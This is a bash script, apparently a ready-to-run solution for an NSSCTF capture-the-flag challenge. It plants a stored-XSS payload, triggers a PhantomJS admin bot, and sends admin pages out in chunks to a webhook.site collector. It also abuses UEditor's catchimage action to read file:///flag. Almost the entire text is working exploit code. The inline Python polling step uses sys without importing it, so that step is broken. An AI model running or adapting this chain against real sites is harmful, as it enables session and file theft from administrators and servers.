#!/bin/bash
# NSSCTF paper 题(存储型XSS -> PhantomJS bot -> admin探测) 一键复打脚本
# 用法: bash nssctf_paper_xss.sh http://nodeX.anna.nssctf.cn:PORT [webhook_uuid]
# 前置: webhook.site 收集器已建(默认用本次的);bot 访问后数据落 webhook,用下面的链接查收
# 查收: https://webhook.site/#!/<uuid>/requests  或  curl https://webhook.site/<uuid>/requests

T="${1:?用法: $0 http://target:port [webhook_uuid]}"
WUUID="${2:-113c6c7d-2852-4cbb-905b-160e5eb03226}"
W="https://webhook.site/$WUUID"
CK=$(mktemp).txt

echo "[1/4] 拿 token(=csrftoken)"
TOK=$(curl -s -m 10 -c "$CK" "$T/api/get_token" | grep -oE '"token": "[^"]*"' | cut -d'"' -f4)
echo "  token=$TOK"

echo "[2/4] 建稿(PhantomJS 版载荷: 纯XHR+分块Image外带,无fetch/Promise)"
cat > /tmp/pl.txt <<EOF
<script>var W='$W';
function send(t,d){var e=encodeURIComponent(''+d);for(var i=0;i<e.length;i+=850){new Image().src=W+'?tag='+t+'&p='+(i/850)+'&d='+e.substr(i,850)+'&t='+Date.now();}}
function grab(u,t){try{var x=new XMLHttpRequest();x.open('GET',u,true);x.onreadystatechange=function(){if(x.readyState==4){send(t,x.responseText||('STATUS:'+x.status));}};x.onerror=function(){send(t+'ERR','neterr');};x.send();}catch(e){send(t+'ERR',''+e);}}
send('HELLO','alive:'+location.href);
grab('/admin/','A1');
grab('/admin/ueditor/?action=config','A2');
grab('/admin/ueditor/controller.html?action=catchimage&source[]=file:///flag','A3');
grab('/admin/ueditor/controller.html?action=catchimage&source[]=file:///flag.txt','A4');
</script>
EOF
U=$(curl -s -m 10 -b "$CK" -H "X-CSRFToken: $TOK" -H "Referer: $T/" --data-urlencode "content=$(cat /tmp/pl.txt)" -d "title=p&token=$TOK" "$T/api/add_paper" | grep -oE -- "[A-Z]{10}")
echo "  稿件: $T/$U"

echo "[3/4] 提交给 bot(send_paper, 端点本身约 9s)"
curl -s -m 30 -b "$CK" -H "X-CSRFToken: $TOK" -H "Referer: $T/" -d "key=$U" "$T/api/send_paper"; echo

echo "[4/4] 轮询 webhook(每 25s,4 分钟;bot 历史延迟 1~10 分钟,没中就手动查链接)"
for i in 1 2 3 4 5 6 7 8 9; do
  sleep 25
  N=$(curl -s -m 12 "https://webhook.site/token/$WUUID/requests?sorting=newest" | python -c "
import json
d=json.load(sys.stdin)
print(sum(1 for it in d.get('data',[]) if isinstance(it.get('query'),dict) and it.get('query',{}).get('tag')))" 2>/dev/null)
  echo "  [$i] tag命中=$N"
  [ "$N" != "0" ] && echo "  命中! 去 $W 查看完整数据" && break
done
echo "收数链接: $W"
